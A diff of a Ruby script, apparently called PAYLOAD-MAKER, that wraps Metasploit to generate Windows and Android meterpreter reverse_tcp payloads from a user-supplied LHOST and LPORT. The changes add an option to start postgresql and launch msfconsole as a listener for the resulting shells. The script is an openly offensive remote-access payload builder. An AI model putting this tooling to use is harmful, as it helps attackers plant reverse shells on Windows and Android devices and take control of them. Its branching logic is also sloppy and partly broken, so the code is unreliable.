@@ -23,7 +23,7 @@ puts "1)Windows/metepreter/reverse_tcp "
 puts "2)Android/meterpreter/reverse_tcp "
 
 
-print "Chose the Number of PAYLOAD : "
+print "Select the Number of PAYLOAD : "
 
 payload = gets.chomp
 
@@ -48,18 +48,21 @@ when "1"
 
      puts "[*] PAYLOAD Genrated @ #{wlocation} [*] "
 
-     puts "[+]..ShutingDown GoodBye..[+] "
+     print "Do you Want to Lunch Listener (y/n) "
+   
+      wlistener = gets.chomp  
+
 
 else "2"
       print "Set your LHOST = "
  
-      alhost = gets.chomp
+         alhost = gets.chomp
 
-      print "Set your LPORT = "
+        print "Set your LPORT = "
 
-       alport = gets.chomp
+        alport = gets.chomp
 
-      print "Loacation of payload = "
+       print "Loacation of payload = "
 
        alocation = gets.chomp
 
@@ -69,9 +72,46 @@ else "2"
 
       puts "[*] PAYLOAD Genrated @ #{alocation} [*] "
 
-      puts "[+]..ShutingDown GoodBye..[+] "
+        print "Do you Want to Lunch Listener (y/n) "
+
+           alistener = gets.chomp
+
 
 end
+
+# [*] Lunchin the listener of Windows/meterpreter/reverse_tcp payload [*] :
+
+if wlistener == "y"
+  puts "[*] Checking postgresql Service [*] "
+  puts "[+] Starting Service postgresql [+] "
+  system("service postgresql start")
+  puts "[+] Lunching MetaSploit-FrameWork.. [+] "
+  system("msfconsole")
+elsif wlistener == "n"
+   puts "[*]..ShutingDown GoodBye..[*] "
+end 
+
+
+# [*] Lunching the listener of Android/meterpreter/reverse_tcp payload [*] :
+
+if alistener == "y"
+  puts "[*] Checking postgresql Service [*] "
+  puts "[+] Starting Service postgresql [+] "
+  system("service postgresql start")
+  puts "[+] Lunching MetaSploit-FrameWork.. [+] "
+  system("msfconsole")
+elsif alistener == "n"
+  puts "[*]..ShutingDown GoodBye..[*] "
+end
+
+=begin
+
+Alot of Special things Comming Soon
+
+PAYLOAD-MAKER v1.0
+
+=end
+
 
 #
 #
